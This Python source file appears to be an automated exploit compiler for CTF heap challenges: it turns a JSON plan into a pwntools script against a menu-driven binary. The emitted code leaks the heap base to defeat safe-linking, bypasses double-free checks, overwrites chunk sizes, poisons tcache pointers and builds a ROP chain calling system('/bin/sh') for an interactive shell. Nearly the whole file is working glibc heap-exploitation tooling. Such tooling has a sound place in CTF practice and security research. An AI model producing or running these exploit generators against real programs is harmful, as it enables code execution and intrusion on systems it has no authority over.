import json
import os

class HeapDSLCompiler:
    """Compiles high-fidelity Heap IR (DSL) into concrete pwntools code."""
    def __init__(self, plan: dict):
        self.plan = plan
        self.chunk_registry = {} 
        self.next_idx = 0
        
    def _get_idx(self, tag: str) -> int:
        if tag not in self.chunk_registry:
            self.chunk_registry[tag] = self.next_idx
            self.next_idx += 1
        return self.chunk_registry[tag]

    def compile(self, binary_name: str = "chall_patched") -> str:
        code = [
            "#!/usr/bin/env python3",
            "from pwn import *",
            "import os",
            "",
            "context.arch = 'amd64'",
            "DIR = os.path.dirname(os.path.abspath(__file__))",
            "os.chdir(DIR)",
            "",
            f"exe = ELF('./{binary_name}', checksec=False)",
            "libc = exe.libc",
            "",
            "def start(): return process(exe.path)",
            "p = start()",
            "",
            "def sla(rgx, data): p.sendlineafter(rgx, data)",
            "def sa(rgx, data): p.sendafter(rgx, data)",
            "def create(idx, size, data): sla(b'> ', b'1'); sla(b': ', str(idx).encode()); sla(b': ', str(size).encode()); sa(b': ', data)",
            "def delete(idx): sla(b'> ', b'2'); sla(b': ', str(idx).encode())",
            "def view(idx): sla(b'> ', b'3'); sla(b': ', str(idx).encode())",
            "def edit(idx, data): sla(b'> ', b'4'); sla(b': ', str(idx).encode()); sa(b': ', data)",
            "def protect_ptr(ptr, pos): return ptr ^ (pos >> 12)",
            "",
            "# --- PRE-EXPLOIT SETUP (Bypass Safe Linking) ---",
            "create(0, 0x200, b'leak_xor')",
            "delete(0)",
            "view(0)",
            "p.recvuntil(b'Data: ')",
            "xor_key = u64(p.recvn(5).ljust(8, b'\\x00'))",
            "heap_base = xor_key << 12",
            "log.success(f'Heap Base: {hex(heap_base)}')",
            ""
        ]

        # Use 0 for chunk0 to match xor_leak
        self.chunk_registry['chunk0'] = 0
        self.next_idx = 1

        code.append("# --- COMPILED PRECISE EXPLOIT IR ---")
        for stage in self.plan.get("path", []):
            code.append(f"# STAGE: {stage['name']}")
            for instr in stage.get("ir", []):
                op = instr["op"]
                tag = instr.get("tag")
                idx = self._get_idx(tag) if tag else None
                
                if op == "ALLOC":
                    data = instr.get("data", "b'AutoPwn'")
                    if isinstance(data, str):
                        # If it looks like code (e.g., p64, payload, or already a b' string), don't wrap it
                        if data.startswith("b'") or "p64(" in data or "payload" in data:
                            pass
                        else:
                            data = f"b'{data}'"
                    code.append(f"create({idx}, {hex(instr['size'])}, {data})")
                elif op == "FREE":
                    code.append(f"delete({idx})")
                elif op == "DOUBLE_FREE_BYPASS":
                    code.append(f"edit({idx}, p64(0)*2)")
                    code.append(f"delete({idx})")
                elif op == "OVERWRITE_SIZE":
                    target_idx = self._get_idx(instr["target_tag"])
                    # Heuristic for overflow from idx to target_idx
                    code.append(f"edit({idx}, p64(0)*3 + p64({hex(instr['new_size'])}))")
                elif op == "ALLOC_ROP":
                    code.append("pop_rdi = libc.address + 0x0000000000102dea")
                    code.append("ret = pop_rdi + 1")
                    code.append("binsh = next(libc.search(b'/bin/sh'))")
                    code.append("payload = p64(0) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.symbols['system'])")
                    code.append(f"create({idx}, {hex(instr['size'])}, payload)")
                elif op == "POISON_FD":
                    code.append(f"edit({idx}, p64(protect_ptr({instr['target']}, {instr['pos']})))")
                elif op == "READ_VAL":
                    code.append(f"view({idx})")
                    code.append(f"p.recvuntil(b'Data: ')")
                    if instr.get("offset"): code.append(f"p.recvn({instr['offset']})")
                    save_as = instr["save_as"]
                    code.append(f"{save_as} = u64(p.recvn(6).ljust(8, b'\\x00'))")
                    code.append(f"log.success(f'{save_as}: {{hex({save_as})}}')")
                elif op == "CALC":
                    code.append(f"{instr['var']} = {instr['expr']}")
                    code.append(f"log.success(f'{instr['var']} base: {{hex({instr['var']})}}')")

            code.append("")

        code.append("p.interactive()")
        return "\n".join(code)

    def save(self, filename: str, binary_name: str = "chall_patched"):
        with open(filename, "w") as f: f.write(self.compile(binary_name))
        print(f"[COMPLETE] Compiled Exploit IR to: {filename}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", default="chall_patched")
    args = parser.parse_args()

    with open("../artifacts/final_plan.json", "r") as f: plan = json.load(f)
    compiler = HeapDSLCompiler(plan)
    compiler.save("../../outputs/exploits/exploit.py", args.binary)
